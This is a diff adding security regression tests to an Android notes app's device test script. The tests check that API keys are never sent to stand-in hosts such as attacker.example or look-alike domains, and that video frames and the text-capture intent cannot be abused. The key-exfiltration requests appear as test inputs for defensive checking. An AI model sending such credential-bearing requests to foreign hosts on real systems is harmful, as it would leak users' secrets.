@@ -77,6 +77,27 @@ if [ -n "$SOCK" ]; then
   sleep 1; shot 04c-today-scheduled
 fi
 
+# 2c. (the outside review's claim 1) an AI key goes only to its own service: a test key for Claude
+#     sent with a request to another address is refused before anything leaves the phone; an
+#     "Other" key is kept only with its https address, and goes only there (not to an address that
+#     merely starts like it). The keys are test words, removed again at the end.
+if [ -n "$SOCK" ]; then
+  AIKEYS=$($CDP eval "(async () => { const L = window.LeanAndroid; if (!L?.aiSend) return 'no bridge'; const ask = (service, req) => new Promise((resolve) => { const id = 'test-' + Math.random().toString(36).slice(2); const on = (e) => { const d = JSON.parse(e.detail); if (d.id !== id) return; document.removeEventListener('lean-ai', on); resolve(d); }; document.addEventListener('lean-ai', on); L.aiSend(id, service, JSON.stringify(req)); setTimeout(() => resolve({ error: 'no answer' }), 20000); }); const body = JSON.stringify({ model: 'x', messages: [] }); const out = {}; out.setClaude = L.aiKeySet('claude', 'sk-ant-test-not-a-real-key'); out.foreign = await ask('claude', { url: 'https://attacker.example/v1/messages', method: 'POST', headers: [['x-api-key', 'page-key']], body, key_required: true }); out.lookalike = await ask('claude', { url: 'https://api.anthropic.com.attacker.example/v1/messages', method: 'POST', headers: [], body, key_required: true }); out.otherNoBase = L.aiKeySetFor ? L.aiKeySetFor('other', 'test-other-key', '') : 'no aiKeySetFor'; out.otherHttp = L.aiKeySetFor ? L.aiKeySetFor('other', 'test-other-key', 'http://llm.example/v1') : 'no aiKeySetFor'; out.otherSet = L.aiKeySetFor ? L.aiKeySetFor('other', 'test-other-key', 'https://llm.example/v1') : 'no aiKeySetFor'; out.otherElsewhere = await ask('other', { url: 'https://attacker.example/v1/chat/completions', method: 'POST', headers: [], body, key_required: true }); out.otherAt = await ask('other', { url: 'https://llm.example/v1@attacker.example/chat/completions', method: 'POST', headers: [], body, key_required: true }); L.aiKeySet('claude', ''); L.aiKeySetFor && L.aiKeySetFor('other', '', ''); out.removed = !L.aiKeyHas('claude') && !L.aiKeyHas('other'); return out; })()" | tr -d '\r')
+  log "AI keys: $AIKEYS"
+fi
+ensure_app
+
+# 2d. (the outside review's claim 2) a video in the notes never plays in a frame inside the app on the
+#     phone: a frame from another site could reach the app's bridge (window.LeanAndroid). Played,
+#     it opens outside the app instead; the test then brings the app back.
+if [ -n "$SOCK" ]; then
+  VIDEO=$($CDP eval "(async () => { const m = await import('./render.js'); const el = document.createElement('span'); el.className = 'yt'; el.dataset.yt = 'aqz-KE-bpKQ'; el.dataset.start = '0'; document.body.append(el); m.playVideo(el); await new Promise(r => setTimeout(r, 1500)); const frames = [...document.querySelectorAll('iframe')].map(f => f.src); el.remove(); return { frames: frames.length, srcs: frames.slice(0, 3) }; })()" | tr -d '\r')
+  log "a video played on the phone: $VIDEO"
+  sleep 2; shot 04d-video-played; alive
+  run adb shell am start -W -n "$PKG/.MainActivity"
+  sleep 3; connect
+fi
+
 ensure_app
 # 3. edit: tap a block (opens the keyboard + toolbar), type, let autosave run
 run python3 scripts/ui_tap.py "cold-proving"
@@ -169,6 +190,24 @@ run adb shell am start -n "$PKG/.SelectionCaptureActivity" -a android.intent.act
 sleep 4; shot 09b-selected
 SELECTED=$(adb shell "cat '/sdcard/vault/Diary/$TODAY.md' '/sdcard/vault/pages/quick capture.md' 2>/dev/null" | tr -d '\r' | grep 'Selected words' || true)
 log "the selected words: $SELECTED"
+
+# 5d. (the outside review's claim 11a) other apps can start "Add to thinky" too, so only Android's
+#     text-menu request counts, at most 20,000 characters, and at most ten a minute
+run adb shell am start -n "$PKG/.SelectionCaptureActivity" --es android.intent.extra.PROCESS_TEXT "'Unasked words from no menu'"
+sleep 2
+# (20,001 characters: sent from a script on the phone, as a command line that long may not fit adb's)
+python3 -c "import sys; print(\"am start -n '$PKG/.SelectionCaptureActivity' -a android.intent.action.PROCESS_TEXT -t text/plain --es android.intent.extra.PROCESS_TEXT 'Toolong\" + 'x' * 19994 + \"'\")" > /tmp/long.sh
+run adb push /tmp/long.sh /data/local/tmp/long.sh
+run adb shell sh /data/local/tmp/long.sh
+sleep 2
+for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
+  adb shell am start -n "$PKG/.SelectionCaptureActivity" -a android.intent.action.PROCESS_TEXT -t text/plain --es android.intent.extra.PROCESS_TEXT "'Burst selection $i'" >/dev/null 2>&1
+  sleep 0.2
+done
+sleep 5; shot 09c-selection-burst
+PICKED=$(adb shell "cat '/sdcard/vault/Diary/$TODAY.md' '/sdcard/vault/pages/quick capture.md' 2>/dev/null" | tr -d '\r')
+NBURST=$(echo "$PICKED" | grep -c 'Burst selection' || true)
+log "selections from the burst that were added: $NBURST of 12"
 
 # 5c. a web page shared whose passages are already in the notes (Build 46): the pop-up lists them,
 #     read only (nothing is added: closed with Back)
@@ -550,6 +589,15 @@ fi
 result "the widgets take each look's colours (journal widget: background, title, +, empty line, rows; the one-tap +)" "python3 -c 'import json,sys; d=json.loads(sys.argv[1]); ok=lambda x: (x[\"got\"].get(\"bg\"), x[\"got\"].get(\"title\"), x[\"got\"].get(\"row\"), x[\"got\"].get(\"empty\"), x[\"got\"].get(\"add\"), x[\"got\"].get(\"circle\")) == (x[\"want\"][\"bg\"], x[\"want\"][\"ink\"], x[\"want\"][\"ink\"], x[\"want\"][\"faint\"], x[\"want\"][\"accent\"], x[\"want\"][\"accent\"]); sys.exit(0 if len(d) == 5 and all(map(ok, d)) else 1)' '$WIDGET'"
 result "the journal widget draws a note as the app does (bold, italics, strike, highlight, code, links and tags in the link colour, heading; to-do boxes drawn: open, ticked, cancelled; a picture from the notes folder as a small picture, a web one by its name)" "python3 -c 'import json,sys; d=json.loads(sys.argv[1]); d=json.loads(d) if isinstance(d,str) else d; a,b,c,p,e,f=d[\"a\"],d[\"b\"],d[\"c\"],d[\"d\"],d[\"e\"],d[\"f\"]; at=lambda r,w: (r[\"text\"].index(w), r[\"text\"].index(w)+len(w)); has=lambda r,k,w: any(x[0]==k and (x[1],x[2])==at(r,w) for x in r[\"spans\"]); ok=a[\"text\"]==\"bold and it gone lit code Sourdough Bread #baking site x^2\" and a[\"box\"]==\"open\" and a[\"picture\"]==0 and has(a,\"bold\",\"bold\") and has(a,\"italic\",\"it\") and has(a,\"strike\",\"gone\") and has(a,\"mark\",\"lit\") and has(a,\"mono\",\"code\") and has(a,\"mono\",\"x^2\") and has(a,d[\"link\"],\"Sourdough Bread\") and has(a,d[\"link\"],\"#baking\") and has(a,d[\"link\"],\"site\") and b[\"text\"]==\"finished Tasks\" and b[\"box\"]==\"done\" and any(x[0]==\"strike\" and x[1]==0 for x in b[\"spans\"]) and c[\"text\"]==\"A heading\" and c[\"box\"]==\"none\" and any(x[0]==\"size\" for x in c[\"spans\"]) and p[\"text\"]==\"A picture\" and p[\"picture\"]>0 and e[\"box\"]==\"cancelled\" and f[\"picture\"]==0 and \"away\" in f[\"text\"]; sys.exit(0 if ok else 1)' '$WTEXT'"
 result "Add to thinky: selected words added with no window, as plain words" "echo '$SELECTED' | grep -q 'Selected words' && ! echo '$SELECTED' | grep -q '\[\[Not A Link\]\]'"
+result "Add to thinky: started without Android's text-menu request, nothing is added" "! echo \"\$PICKED\" | grep -q 'Unasked words'"
+result "Add to thinky: more than 20,000 characters, nothing is added" "! echo \"\$PICKED\" | grep -q 'Toolong'"
+result "Add to thinky: a burst of selections stops at ten a minute (some added, not all twelve)" "[ '$NBURST' -ge 1 ] && [ '$NBURST' -le 10 ]"
+result "Add to thinky: the words of a quick run of selections are all written (none lost to another)" "[ '$NBURST' -ge 9 ]"
+if [ -n "$SOCK" ]; then
+result "an AI key isn't sent to another address (Claude's key, a request elsewhere or to a look-alike name)" "python3 -c 'import json,sys; d=json.loads(sys.argv[1]); ok=lambda r: \"key wasn\" in r.get(\"error\",\"\"); sys.exit(0 if d[\"setClaude\"]==\"\" and ok(d[\"foreign\"]) and ok(d[\"lookalike\"]) else 1)' \"\$AIKEYS\""
+result "an Other key is kept only with its https address, and goes nowhere else" "python3 -c 'import json,sys; d=json.loads(sys.argv[1]); ok=lambda r: \"key wasn\" in r.get(\"error\",\"\"); sys.exit(0 if d[\"otherNoBase\"] and d[\"otherHttp\"] and d[\"otherSet\"]==\"\" and ok(d[\"otherElsewhere\"]) and ok(d[\"otherAt\"]) and d[\"removed\"] else 1)' \"\$AIKEYS\""
+result "a video played on the phone opens no frame from another site inside the app" "python3 -c 'import json,sys; d=json.loads(sys.argv[1]); sys.exit(0 if d[\"frames\"]==0 else 1)' \"\$VIDEO\""
+fi
 result "both widgets are offered to the home screen" "adb shell dumpsys appwidget | grep -qi journalwidget && adb shell dumpsys appwidget | grep -qi quickaddwidget"
 result "the app sets up its icon shortcuts Today, Add note and Search" "grep -q '{id=today' $OUT/shortcuts.txt && grep -q '{id=add' $OUT/shortcuts.txt && grep -q '{id=search' $OUT/shortcuts.txt"
 result "pressing and holding the app icon shows them" "menu_shown"
